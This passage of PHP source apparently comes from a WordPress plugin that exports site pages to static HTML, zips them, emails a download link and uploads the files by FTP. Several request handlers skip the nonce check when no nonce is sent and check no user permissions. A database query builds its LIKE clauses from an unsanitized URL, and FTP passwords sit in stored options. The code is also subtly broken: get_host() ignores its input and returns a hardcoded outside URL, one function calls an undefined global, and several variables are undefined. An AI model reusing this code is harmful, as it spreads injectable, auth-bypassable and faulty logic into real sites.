								//$this->update_export_log($url, 'replacing');
								$ok = $this->export_wp_page_as_static_html_by_page_id($url, $replace_urls_to_hash, $html_filename2, $replace_urls3, true, false, true, $url_host);
							}
						} 

						elseif ($all_links) {
							if (strpos($url, $home_url) !== false && strpos($url, 'wp-admin') == false  && strpos($url, 'wp-login.php') == false ) {
								$ok = $this->export_wp_page_as_static_html_by_page_id($url, $replace_urls_to_hash, $html_filename2, $replace_urls3, true, $url_host);
							}
						
						}

					}
				}

				return explode('#', $matches[0])[0];
			}, $src);		
		}	

		//$gop = get_option('rc_url_to_replace');
		if (/*!empty($this->get_find_as_key_replace_as_value())*/ true) {

			$src = preg_replace_callback("/(?<=href=\").*?(?=\")/", 			
				function ($matches) use ($main_url, $full_site, $all_links, $custom_url_host, $path_to_dot, $replace_urls_to_hash){

				// $middle_pathes = $this->get_find_as_key_replace_as_value($matches[0], true);

				// if (!empty($middle_pathes)) {
				// 	return $middle_pathes;
				// }
				$url = apply_filters('before_url_change_to_html', $matches[0]);

				$url_with_slash = rtrim($url, '/');

				//if ($all_links || $full_site) {
				
					// if ($matches[0] == home_url('/') && ($full_site)||$all_links) {
					// 	$basename = 'index';
					// }
					// elseif (!empty($this->get_replace_data_by_url($matches[0])) ) {
					// 	$basename = $this->get_replace_data_by_url($matches[0]);
					// }

					// if (!isset($basename)) {
						
					// }
				global $wpdb;
				$results = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs WHERE id = '1' AND path LIKE '{$url}' OR path LIKE '{$url_with_slash}'");

				//$this->ttt($url);
					$basename = basename($url);

					if ($results) {
						$basename = 'index';
					}

					$home_url = home_url();
 					$custom_url_ = false;
					if (!empty($custom_url_host)) {
						$home_url = $custom_url_host;
						$custom_url_ = true;
					}

					
						if (strpos($url, $home_url) !== false && strpos($url, 'wp-admin') == false  && strpos($url, 'action=lostpassword') == false  && strpos($url, 'wp-login.php') == false ) {
							$mp = $this->rc_get_url_middle_path($url, $custom_url_, $full_site);
							$dot = $path_to_dot;

							//$this->ttt($dot);
							$gop = get_option('rc_url_to_replace');
							if (in_array($url, $gop['find'])!==false||in_array(basename($url), $gop['find'])!==false) {

								/*if ($bn = str_replace($gop['find'], $gop['replace'], $matches[0])) {
									$basename = basename($bn);
								}*/

								$basename = apply_filters('before_basename_change', $basename, $url); 
								return $dot . $mp . $basename . '.html';
							}

							elseif ($replace_urls_to_hash) {
								if (in_array($url, $gop['find'])==false||in_array(basename($url), $gop['find'])==false) {
									return '#';
								}
							}

						} else {
							
							if (strpos($url, '../')!==false) {
								
								return "";
							}
							return $url;
						}
					/*}
					else {}
				*/
				
				return $url;
					
			}, $src);

		}
		//




		$add = "";
		if (!empty($middle_path)) {
			$add = $middle_path;
		}

		$post_name = get_option('rc_single_post_exporting_post_name');
    	if (get_option('rc_single_post_exporting') == 'on'&&!empty($post_name)&&strpos($html_filename, 'index.html')!==false) {
    		$html_filename = $post_name.'.html';
    		update_option('rc_single_post_exporting', '');
    		update_option('rc_single_post_exporting_post_name', '');
    	}

		$my_file = $upload_dir . '/exported_html_files/tmp_files/'. $add . $html_filename;
		if (!file_exists($my_file) && $this->update_export_log('', 'creating_html_file', $html_filename)) {	


			$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);

			$t = fwrite($handle, $src);

			if ($t) {
				$this->update_export_log('', 'created_html_file', $html_filename);
			}
			fclose($handle);
		}


		return true;

	}

	public function update_export_log($path="", $type = "copying", $comment = ""){
		global $wpdb;

		$wpdb->insert( 
			$wpdb->prefix . 'export_page_to_html_logs', 
			array( 
				'path' => $path, 
				'type' => $type, 
				'comment' => $comment, 
			), 
			array( 
				'%s',
				'%s',
				'%s',
			) 
		);

		return true;
	}

	public function ttt($new = ""){

		$gop = get_option('tttt0000');

		if (!empty($gop)) {

			if (!empty($new)) {
				$gop[] = $new;
			}
			

		} else {
			$gop = array();
			$gop[] = $new;
		}

		update_option('tttt0000', $gop);

		return $gop;
	}

	public function get_exporting_logs(){
		$id = isset($_POST['log_id']) ? sanitize_key($_POST['log_id']) : 0;
		$nonce = isset($_POST['rc_nonce']) ? sanitize_key($_POST['rc_nonce']) : "";

		if(!empty($nonce)){
			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));

				die();
			}
		}
		$id = intval($id);

		$logs = $this->get_export_log_by_id($id);

		
		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $logs));
	
		die();
	}

	public function get_export_log_by_id($id=0){
		global $wpdb;

		//$id = $id-1;

		//$id = intval($id);
		if (is_numeric($id)) {
			if ($id == 0) {
				$logs = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs ORDER BY id ASC LIMIT 50");
				
				return $logs;
			} else {
				
				$logs = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}export_page_to_html_logs ORDER BY id ASC LIMIT 50 OFFSET {$id}");

				return $logs;
			}
		}
	}

	public function create_zip($files = array(), $destination = '', $middle_patheplace_path = "", $overwrite = true) {
		if ($this->is_cancel_command_found()) {
			return false;
		}
		//if the zip file already exists and overwrite is false, return false
		if(file_exists($destination) && !$overwrite) { return false; }
		//vars
		$valid_files = array();
		//if files were passed in...
		if(is_array($files)) {
			//cycle through each file
			foreach($files as $file) {
				//make sure the file exists
				if(file_exists($file)) {
					if (is_file($file)) {
						$valid_files[] = $file;
					}
					
				}
			}
		}
		//if we have good files...
		if(count($valid_files)) {

			//create the archive
			$overwrite = file_exists($destination) ? true : false ;
			$zip = new ZipArchive();
			if($zip->open($destination, $overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true) {
				return false;
			}

			//add the files
			foreach($valid_files as $file) {
				$filename = str_replace( $middle_patheplace_path, '', $file);
				//$this->update_export_log($filename);
				$zip->addFile($file, $filename);
			}
			//debug
			//echo 'The zip archive contains ',$zip->numFiles,' files with a status of ',$zip->status;
			
			//close the zip -- done!
			$zip->close();
			
			//check to make sure the file exists
			return file_exists($destination) ? 'created' : 'not' ;
		}
		else
		{
			return false;
		}
	}


	public function create_the_zip_file(){
		$page_id = isset($_POST['page_id']) ? sanitize_key($_POST['page_id']) : "";
		$nonce = isset($_POST['rc_nonce']) ? sanitize_key($_POST['rc_nonce']) : "";

		global $wpdb;

		if(!empty($nonce)){
			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));

				die();
			}
		}

		$post = get_post($page_id);
		$post_name = $post->post_name;

		$upload_dir = wp_upload_dir()['basedir'];
		$upload_url = wp_upload_dir()['baseurl'] . '/exported_html_files';

		$all_files = $upload_dir . '/exported_html_files/tmp_files';
		$files = $this->get_all_files_as_array($all_files);

		$zip_file_name = $upload_dir . '/exported_html_files/'.$post_name.'-html.zip';

		ob_start();
		echo $this->create_zip($files, $zip_file_name, $all_files . '/');
		$create_zip = ob_get_clean();

		if ($create_zip == 'created') {
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');
			$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");
		}

		$middle_pathesponse = ($create_zip == 'created') ? $upload_url . '/'.$post_name.'-html.zip' : false;

		
		echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $middle_pathesponse));
	
		die();
	}

	public function get_all_files_as_array($all_files){

		
		ob_start();
		$this->rc_get_sub_dir1($all_files);
		$files = ob_get_clean();
		$files = rtrim($files, ',');
		$files = explode(',', $files);

		return $files;
	}
	public function rc_get_sub_dir1($dir) {
	    foreach(scandir($dir) as $file) {
	        if ('.' === $file || '..' === $file) continue;
	        if (is_dir("$dir/$file")) $this->rc_get_sub_dir1("$dir/$file");
	        echo "$dir/$file" . ',';
	    }
	}


	public function get_all_files_as_array2($all_files){

		ob_start();
		$this->rc_get_sub_dir($all_files);
		$files = ob_get_clean();
		$files = rtrim($files, ',');
		$files = explode(',', $files);
		return $files;
	
	}
	public function rc_get_sub_dir($dir) {
	    foreach(scandir($dir) as $file) {
	        if ('.' === $file || '..' === $file) continue;
	        if (is_dir("$dir/$file")) $this->rc_get_sub_dir("$dir/$file");
	        if(is_file("$dir/$file")) echo "$dir/$file" . ',';
	    }
	}

	public function override_ftp_upload_files($ftpConn, $path = ''){

		$upload_dir = wp_upload_dir()['basedir'] . '/exported_html_files/tmp_files';

		$all_files = $this->get_all_files_as_array2($upload_dir);

		if (!empty($all_files)) {
			foreach ($all_files as $key => $file) {
				$file2 = str_replace($upload_dir, $path, $file);
				//@ftp_delete($ftpConn, $file2 );

				if (is_cancel_command_found()) {
					$this->update_export_log($file2, 'file_uploaded_to_ftp');
					$upload = @ftp_put($ftpConn, $file2, $file, FTP_BINARY);
				}
				
			}
		}
	}

		public function rc_search_posts(){
			//$post = $_POST['post'];
			$value = isset($_POST['value']) ? $_POST['value'] : "";
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}
			$args = array(
			    'post_type' => 'post',
			    'post_status' => 'publish',
			    's' => $value
			);



			$query = new WP_Query( $args );

			$middle_pathesponse = "";

			$options = array();
			ob_start();
			if (!empty($query->posts)) {
				foreach ($query->posts as $key => $post) {
					$post_id = $post->ID; 
                    $post_title = $post->post_title; 
                    $permalink = get_the_permalink($post_id);
                    $parts = parse_url($permalink);
                    parse_str($parts['query'], $query);

                    if (!empty($query)) {
                        $permalink = strtolower(str_replace(" ", "-", $post_title));
                    }

                    $option = array();
                    /*$option['post_id'] = $post_id; 
                    $option['post_title'] = $post_title; */

                    $option['id'] = $post_id; 
                    $option['text'] = $post_title; 

                    $option['permalink'] = $permalink; 

                    $options[] = $option;

				}
			}

			if (!empty($options)) {
				$middle_pathesponse = $options;
			}
	
			
			//echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $middle_pathesponse));

			echo json_encode(array('success' => 'true', 'status' => 'success', 'results' => $middle_pathesponse, 'pagination' => array ('more' => false)));
		
			die();
		}



		public function add_cron_job_to_start_html_exporting(){
			//$post = $_POST['post'];
			$export_data = isset($_POST['export_data']) ? $_POST['export_data'] : "";
			
			$replace_urls = isset($_POST['replace_urls']) && sanitize_key($_POST['replace_urls']) == "true" ? true : false;
			$skip_image_src_url = isset($_POST['skip_image_src_url']) && sanitize_key($_POST['skip_image_src_url']) == "true" ? true : false;

			$data = stripslashes($export_data);

			$ftp = isset($_POST['ftp']) ? $_POST['ftp'] : false;
			$path = isset($_POST['path']) ? $_POST['path'] : '';
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}


			update_option('rc_skip_image_src_url', $skip_image_src_url);
			global $wpdb;

			$upload_dir = wp_upload_dir()['basedir'];
			$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');

			$ftp_status = get_option('rc_export_html_ftp_connection_status');

			if ($ftp !== 'false' && $ftp_status == 'connected') {
				update_option('rc_export_html_ftp_upload_enabled', 'yes');
			}
			else{
				update_option('rc_export_html_ftp_upload_enabled', 'no');
			}


			$ok = false;
			if (!empty($data)) {
				update_option('export_html_page_data', $data);
				$datas = json_decode($data);

				$url_to_replace = $this->search_and_replace_url($datas, false);
				update_option('rc_url_to_replace', $url_to_replace);

				$ok = true; //$this->create_html_files($datas, $replace_urls);

			}
 	
			$receive_email = isset($_POST['receive_email']) && sanitize_key($_POST['receive_email']) == "true" ? true : false;
 			$email_lists = isset($_POST['email_lists']) ? $_POST['email_lists'] : "";

 			if ($receive_email) {
 				wp_schedule_single_event( time() , 'rc_export_new_event', array( $datas, $replace_urls, $email_lists, $path ) );
 			} else {
 				wp_schedule_single_event( time() , 'rc_export_new_event', array( $datas, $replace_urls, 'no', $path ) );
 			}
			


			if ($ok) {
				echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $middle_pathesponse));

				/*global $wpdb;
				$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");*/
			} else {
				echo json_encode(array('success' => 'false', 'status' => 'error', 'response' => 'Something went wrong'));
			}
	
			die();

		}

		public function add_cron_job_to_start_html_exporting2(){
			//$post = $_POST['post'];
			$export_data = isset($_POST['export_data']) ? $_POST['export_data'] : "";
			
			$replace_urls = isset($_POST['replace_urls']) && sanitize_key($_POST['replace_urls']) == "true" ? true : false;

			$data = stripslashes($export_data);

			$ftp = isset($_POST['ftp']) ? $_POST['ftp'] : 'false';
			$nonce = isset($_POST['rc_nonce']) ? $_POST['rc_nonce'] : "";
	
			if(!empty($nonce)){
				if(!wp_verify_nonce( $nonce, "rc-nonce" )){
					echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));
	
					die();
				}
			}

			global $wpdb;

			$upload_dir = wp_upload_dir()['basedir'];
			$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');

			$ftp_status = get_option('rc_export_html_ftp_connection_status');

			if ($ftp !== 'false' && $ftp_status == 'connected') {

				$ftp_data = get_option('rc_export_html_ftp_data');

				$host = $user = $pass = $path = "";
				if (isset($ftp_data->host)) {
					$host = $ftp_data->host;
				}
				if (isset($ftp_data->user)) {
					$user = $ftp_data->user;
				}
				if (isset($ftp_data->pass)) {
					$pass = $ftp_data->pass;
				}
				if (isset($ftp_data->path)) {
					$path = $ftp_data->path;
				}

				if (function_exists('ftp_connect') && function_exists('ftp_login')) {

					if (!empty($host) && !empty($user) && !empty($pass)) {
						$ftpConn = ftp_connect($host);
						$login = ftp_login($ftpConn,$user,$pass);

						if ($ftpConn && $login) {
							update_option('rc_export_html_ftp_upload_enabled', 'yes');
							
						} 
						else {

							update_option('rc_export_html_ftp_upload_enabled', 'no');
							echo json_encode(array('success' => 'false', 'status' => 'ftp_login_error', 'response' => 'Something went wrong'));
							die();
						}

						ftp_close($ftpConn); 

					} else {
						echo json_encode(array('success' => 'false', 'status' => 'ftp_creadentials_empty', 'response' => 'Some login data missing'));
						die();
					}

				} else {
					echo json_encode(array('success' => 'false', 'status' => 'ftp_not_enabled', 'response' => 'FTP not enabled on php'));
						die();
				}

				
			}
			else{
				update_option('rc_export_html_ftp_upload_enabled', 'no');
			}


			$ok = false;
			if (!empty($data)) {
				update_option('export_html_page_data', $data);
				$datas = json_decode($data);

				$url_to_replace = $this->search_and_replace_url($datas, false);
				update_option('rc_url_to_replace', $url_to_replace);

				$ok = true; //$this->create_html_files($datas, $replace_urls);

			}
 	
			$receive_email = isset($_POST['receive_email']) && sanitize_key($_POST['receive_email']) == "true" ? true : false;
 			$email_lists = isset($_POST['email_lists']) ? $_POST['email_lists'] : "";

 			if ($receive_email) {
 				wp_schedule_single_event( time() , 'rc_export_new_event2', array( $url, $replace_urls, $email_lists ) );
 			} else {
 				wp_schedule_single_event( time() , 'rc_export_new_event2', array( $url, $replace_urls, 'no' ) );
 			}
			


			if ($ok) {
				echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $middle_pathesponse));

				/*global $wpdb;
				$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");*/
			} else {
				echo json_encode(array('success' => 'false', 'status' => 'error', 'response' => 'Something went wrong'));
			}
	
			die();

		}



	public function rc_export_pages_cron_task( $datas, $replace_urls, $receive_email, $path2 ) {

		update_option('rc_export_pages_as_html_task', 'running');


    	$ok = $this->create_html_files($datas, $replace_urls);

    	if ($ok && !$this->is_cancel_command_found()) {

	    	$post = get_post($page_id);
	    	if (!empty($post)) {
	    		$post_name = $post->post_name;
	    	}

			if (count($datas) == 1) {
				$slug = $datas[0]->post_name;
				$post_name = str_replace('index', 'homepage', $slug);
			}
			elseif (count($datas) > 1) {
				$post_name = $this->get_zip_name($datas);
			}
			$this->update_export_log('', 'creating_zip_file', $post_name.'-html.zip');
			

			$upload_dir = wp_upload_dir()['basedir'];
			$upload_url = wp_upload_dir()['baseurl'] . '/exported_html_files';

			$all_files = $upload_dir . '/exported_html_files/tmp_files';
			$files = $this->get_all_files_as_array($all_files);
			$post_name = urlencode($post_name);
			$zip_file_name = $upload_dir . '/exported_html_files/'.$post_name.'-html.zip';

			ob_start();
			echo $this->create_zip($files, $zip_file_name, $all_files . '/');
			$create_zip = ob_get_clean();

			global $wpdb;
			if ($create_zip == 'created') {
				/*$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');
				$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");*/

				update_option('rc_is_export_pages_zip_downloaded', 'no');
				$url = $upload_url . '/'.$post_name.'-html.zip';
				$this->update_export_log($url, 'created_zip_file', $post_name.'-html.zip');

				if ($receive_email !== 'no') {
					$this->send_emails($receive_email, $url);
				}
				
				//$this->update_export_log('', 'uploading_to_ftp', '');

				if (get_option('rc_export_html_ftp_upload_enabled') == 'yes') {
					$ftp_data = get_option('rc_export_html_ftp_data');

					$host = $user = $pass = $path = "";
					if (isset($ftp_data->host)) {
						$host = $ftp_data->host;
					}
					if (isset($ftp_data->user)) {
						$user = $ftp_data->user;
					}
					if (isset($ftp_data->pass)) {
						$pass = $ftp_data->pass;
					}
					if (isset($ftp_data->path)) {
						$path = $ftp_data->path;
					}

					if (!empty($path2)) {
						$path = $path2;
					}

					if (function_exists('ftp_connect') && function_exists('ftp_login')){
						if (!empty($host) && !empty($user) && !empty($pass)) {
							$ftpConn = ftp_connect($host);
							$login = ftp_login($ftpConn,$user,$pass);

							if ($ftpConn && $login) {
								//@$this->ftp_rrmdir($ftpConn, $path);
								if (!@ftp_nlist($ftpConn, $path)) {
					                //ftp_mkdir($ftpConn, $path);
					                $this->ftp_mksubdirs($ftpConn, '/', $path);
					                @ftp_chdir($ftpConn, '/');
					            }



								$this->update_export_log('', 'uploading_to_ftp', '');
								//b
								if ($this->rc_if_images_directory_found($ftpConn, $path)) {

									$this->override_ftp_upload_files($ftpConn, $path);
								}
								else{
									$this->ftp_putAll($ftpConn, $all_files, $path);
								}
								


					            ftp_close($ftpConn);

					    		update_option('rc_export_pages_as_html_task', 'completed');
					    		//wp_clear_scheduled_hook( 'rc_check_for_errors_every_five_minutes' );

								$this->update_export_log('', 'uploaded_to_ftp', '');
							}
							else {
					    		update_option('rc_export_pages_as_html_task', 'failed');
								$this->update_export_log('', 'login_failed_to_ftp', '');
							}
						}
					}
				}


				update_option('rc_export_pages_as_html_task', 'completed');
			}

			$response = ($create_zip == 'created') ? $upload_url . '/'.$post_name.'-html.zip' : false;


    	} else {
    		update_option('rc_export_pages_as_html_task', 'failed');
    	}
    	//wp_clear_scheduled_hook('rc_export_new_event');
	}

	public function rc_export_pages_cron_task2( $url, $replace_urls, $receive_email, $full_site, $path2 ) {

		update_option('rc_export_pages_as_html_task', 'running');

		$fullsite = false;
		if ($full_site == 'true') {
			$fullsite = true;
		}

		//update_option('ttt32', var_dump($full_site));
    	$ok = $this->create_html_files($url, $replace_urls, true, $fullsite);

    	if ($ok && !$this->is_cancel_command_found()) {

    		if ($this->get_host($url) == $url) {
    			$post_name = 'index';
    		}
    		else {
    			$post_name = basename($url);
    		}
	    	
			$this->update_export_log('', 'creating_zip_file', $post_name.'-html.zip');
			

			$upload_dir = wp_upload_dir()['basedir'];
			$upload_url = wp_upload_dir()['baseurl'] . '/exported_html_files';

			$all_files = $upload_dir . '/exported_html_files/tmp_files';
			$files = $this->get_all_files_as_array($all_files);
			$post_name = urlencode($post_name);
			$zip_file_name = $upload_dir . '/exported_html_files/'.$post_name.'-html.zip';

			ob_start();
			echo $this->create_zip($files, $zip_file_name, $all_files . '/');
			$create_zip = ob_get_clean();

			global $wpdb;
			if ($create_zip == 'created') {
    		update_option('rc_is_export_pages_zip_downloaded', 'no');
				/*$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');
				$wpdb->query("TRUNCATE TABLE {$wpdb->prefix}export_page_to_html_logs");*/

				$url = $upload_url . '/'.$post_name.'-html.zip';
				$this->update_export_log($url, 'created_zip_file', $post_name.'-html.zip');

				if ($receive_email !== 'no') {

					$this->send_emails($receive_email, $url);
				}
				
				//$this->update_export_log('', 'uploading_to_ftp', '');

				if (get_option('rc_export_html_ftp_upload_enabled') == 'yes') {
					$ftp_data = get_option('rc_export_html_ftp_data');

					$host = $user = $pass = $path = "";
					if (isset($ftp_data->host)) {
						$host = $ftp_data->host;
					}
					if (isset($ftp_data->user)) {
						$user = $ftp_data->user;
					}
					if (isset($ftp_data->pass)) {
						$pass = $ftp_data->pass;
					}
					if (isset($ftp_data->path)) {
						$path = $ftp_data->path;
					}

					if (!empty($path2)) {
						$path = $path2;
					}

					if (function_exists('ftp_connect') && function_exists('ftp_login')){
						if (!empty($host) && !empty($user) && !empty($pass)) {
							$ftpConn = ftp_connect($host);
							$login = ftp_login($ftpConn,$user,$pass);

							if ($ftpConn && $login) {

								//@$this->ftp_rrmdir($ftpConn, $path);

								if (!@ftp_nlist($ftpConn, $path)) {
					                //ftp_mkdir($ftpConn, $path);
					                $this->ftp_mksubdirs($ftpConn, '/', $path);
					                @ftp_chdir($ftpConn, '/');
					            }



								$this->update_export_log('', 'uploading_to_ftp', '');

								if ($this->rc_if_images_directory_found($ftpConn, $path)) {

									$this->override_ftp_upload_files($ftpConn, $path);
								}
								else{
									$this->ftp_putAll($ftpConn, $all_files, $path);
								}
								


					            ftp_close($ftpConn);

    							update_option('rc_export_pages_as_html_task', 'completed');
    							//wp_clear_scheduled_hook( 'rc_check_for_errors_every_five_minutes' );

								$this->update_export_log('', 'uploaded_to_ftp', '');
							}
							else {

    							update_option('rc_export_pages_as_html_task', 'failed');
								$this->update_export_log('', 'login_failed_to_ftp', '');
							}
						}
					}
				}

				update_option('rc_export_pages_as_html_task', 'completed');

			}

			$response = ($create_zip == 'created') ? $upload_url . '/'.$post_name.'-html.zip' : false;


    	} else {
    		update_option('rc_export_pages_as_html_task', 'failed');
    	}
    	//wp_clear_scheduled_hook('rc_export_new_event');
	}
	
	public function ftp_rrmdir($conn_id, $directory){
	    $lists = ftp_mlsd($conn_id, $directory);

	    foreach($lists as $list){
	        $full = $directory . '/' . $list['name'];

	        if ($list['type']=='dir'||$list['type']=='file') {
		        if($list['type'] == 'dir'){
		            $this->ftp_rrmdir($conn_id, $full);
		        }else{
		            ftp_delete($conn_id, $full);
		        }
		    }
	    }

	    ftp_rmdir($conn_id, $directory);
	    return true;
	}

	public function get_host($url='')
	{
		$url = parse_url($url);
		$scheme = isset($url['scheme']) ? $url['scheme'] : '';
		$host = isset($url['host']) ? $url['host'] : '';
		return 'https://fineartofdecals.com/goodies/';
	}

	public function send_emails($emails='', $zipLink='')
	{
		if (!empty($emails)) {

			$emails = explode(',', $emails);

			foreach ($emails as $key => $email) {
				$to = $email;
				$subject = 'HTML export has been completed!';
				
				$body = "Your last html export request has been completed. Please download the file from here: <a href='{$zipLink}'>{$zipLink}</a>";
				$headers = array('Content-Type: text/html; charset=UTF-8');
				 
				wp_mail( $to, $subject, $body, $headers );
			}
			
		}
		else {
			$to = get_bloginfo('admin_email');
				$subject = 'HTML export has been completed!';
			$body = "Your last html export request has been completed. Please download the file from here: <a href='{$zipLink}'>{$zipLink}</a>";
			$headers = array('Content-Type: text/html; charset=UTF-8');
			 
			wp_mail( $to, $subject, $body, $headers );
		}
	}

	public function create_html_files($datas, $replace_urls_to_hash = false, $custom_url = false, $custom_url_fullsite = false){
		if (!empty($datas)) {
			
			$find_replace = get_option('rc_url_to_replace');
			$html_filename = 'index.html';

			if (!$custom_url) {
				
				if ($this->if_fullsite_export_command_found($datas)) {

					update_option('k22', 'fullsite_export_command_found');
					$page = $this->if_fullsite_export_command_found($datas, true);
					$permalink = $page->permalink;
					$title = $page->title;
					$page_id = $page->page_id;
					$post_name = $page->post_name;
					$is_homepage = $page->is_homepage;
					$is_full_site = $page->is_full_site;
					$is_all_links = $page->is_all_links;

					$html_filename = 'index.html';

					$ok = $this->export_wp_page_as_static_html_by_page_id($page_id, $replace_urls_to_hash, $html_filename, $find_replace, false, true, true);
				} else {
					update_option('k222', 'fullsite_export_command_not_found');
					foreach ($datas as $key => $page) {
						$permalink = $page->permalink;
						$title = $page->title;
						$page_id = $page->page_id;
						$post_name = $page->post_name;
						$is_homepage = $page->is_homepage;
						$is_full_site = $page->is_full_site;
						$is_all_links = $page->is_all_links;

						$html_filename = $post_name . '.html';

						$ok = $this->export_wp_page_as_static_html_by_page_id($page_id, $replace_urls_to_hash, $html_filename, $find_replace, false, $is_all_links);

						if (!$ok) {
							return  false;
							break;
						}
					}
				}

			}
			else {
				$url = $datas;
				$host = $this->get_host($url);


				if ($custom_url_fullsite) {
					$ok = $this->export_wp_page_as_static_html_by_page_id($url, $replace_urls_to_hash, $html_filename, array(), true, false, true, $host);
				}
				else
				{
					$ok = $this->export_wp_page_as_static_html_by_page_id($url, $replace_urls_to_hash, $html_filename, array(), true, false, false, $host);	
				}
				

				if (!$ok) {
					return  false;
				}
			}
			
			/*update_option('rc_expoting_errors_appear', false);
	    	update_option('rc_previous_logs_count', '0');
			$this->rc_check_for_errors_every_five_minutes();*/

		}

		return true;
	}

	public function search_and_replace_url($datas='', $href = true, $option = false)
	{
		$find = $middle_patheplace = array();

		if (!$option) {
			if (!empty($datas)) {
				foreach ($datas as $key => $page) {
					/*$permalink = '(' . $page->permalink . ')$';
					$permalink = str_replace('/', '\/', $permalink);;
					$find[] = '/' . $permalink . '/';*/
					if ($href) {
						$permalink = 'href="' . $page->permalink . '"';
						$to_replace = 'href="' . $page->post_name . '.html"';
					} else {
						$permalink = $page->permalink;
						$to_replace = $page->post_name;
					}

					//$permalink = str_replace('/', '\/', $permalink);;
					$find[] = $permalink;
					$middle_patheplace[] = $to_replace;
				}
			}
		} else {
			$option = get_option('export_html_page_data');
			$datas = json_decode($option);

			if (!empty($datas)) {
				foreach ($datas as $key => $page) {
					/*$permalink = '(' . $page->permalink . ')$';
					$permalink = str_replace('/', '\/', $permalink);;
					$find[] = '/' . $permalink . '/';*/
					if ($href) {
						$permalink = 'href="' . $page->permalink . '"';
						$to_replace = 'href="' . $page->post_name . '.html"';
					} else {
						$permalink = $page->permalink;
						$to_replace = $page->post_name;
					}

					//$permalink = str_replace('/', '\/', $permalink);;
					$find[] = $permalink;
					$middle_patheplace[] = $to_replace;
				}
			}
		}


		$find_replace = array();
		$find_replace['find'] = $find;
		$find_replace['replace'] = $middle_patheplace;

		return $find_replace;
	}



	public function get_zip_name($datas='')
	{
		$name = "";
		$x = 0;

		if ($this->if_fullsite_export_command_found($datas)) {
			$name = 'full-site';
		}
		else {
			if (!empty($datas)) {
				foreach ($datas as $key => $page) {
					if ($x <= 2) {
						$name .= $page->post_name . '&';
					}

					$x++;
				}
			}

			if ($x>2) {
				$more = ($this->get_exported_html_files_count()-3);
				if ($more < 2) {
					$name .= $more . '-more-page';
				}
				else{
					$name .= $more . '-more-pages';
				}
				
			}
		}


		return rtrim($name, '&');
	}

	public function get_exported_html_files_count()
	{
		global $wpdb;
		$count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}export_page_to_html_logs WHERE type = 'creating_html_file' ");

		return $count;
	}

	public function if_fullsite_export_command_found($datas, $return_data = false){
		if (!empty($datas)) {
			foreach ($datas as $key => $page) {
				if ($page->page_id == 'home_page') {
					if ($page->is_full_site == true) {
						if ($return_data) {
							return $page;
						}
						else {
							return true;
						}
						
						break;
					}
				}
			}
		}
		return false;
	}

	public function add_rc_url_to_replace_data($find_data = "", $replace_data = ""){

		$gop = get_option('rc_url_to_replace');

		$find = $replace = array();
		if (!empty($gop)) {
			$find = $gop['find'];
			$replace = $gop['replace'];
		}

		if (!empty($find_data)&&!in_array($find_data, $find)) {
			$find[] = $find_data;
			$replace[] = $replace_data;
		
			$u = array();
			$u['find'] = $find;
			$u['replace'] = $replace;

			update_option('rc_url_to_replace', $u);

			return $u;
		} else {
			return $gop;
		}

	}

	public function get_find_as_key_replace_as_value($f_link = "", $middle_path = false){
		$values = $this->add_rc_url_to_replace_data();

		$fr = array();
		if (isset($values['find'])&&isset($values['replace'])&&!empty($values['find'])&&!empty($values['replace'])) {
			foreach ($values['find'] as $key => $value) {

				if ($middle_path && !empty($f_link)) {
					if ($fr[$value] == $f_link) {
						return $values['replace'][$key];
						break;
					}
				} else {
					$fr[$value] = $values['replace'][$key];	
				}
			}
		}


		return $fr;
	}

	public function get_replace_data_by_url($url='')
	{
		$values = $this->add_rc_url_to_replace_data();

		$fr = array();
		if (isset($values['find'])&&isset($values['replace'])&&!empty($values['find'])&&!empty($values['replace'])) {
			foreach ($values['find'] as $key => $value) {
				/*$arr = array();
				$arr['find'] = $value;
				$arr['replace'] = $values['replace'][$key];
				$fr[] = $arr;*/

				if ($url == $value) {
					return $values['replace'][$key];
					break;
				}
			}
		}
		return false;
	}

	public function get_find_data_by_slug($slug='')
	{
		$values = $this->add_rc_url_to_replace_data();

		$fr = array();
		if (isset($values['find'])&&isset($values['replace'])&&!empty($values['find'])&&!empty($values['replace'])) {
			foreach ($values['replace'] as $key => $value) {

				if ($slug == $value) {
					return $values['find'][$key];
					break;
				}
			}
		}
		return false;
	}

	public function save_all_links_to_db($datas){
		if ( $this->if_fullsite_export_command_found($datas) ) {
			
		} else {

		}
	}

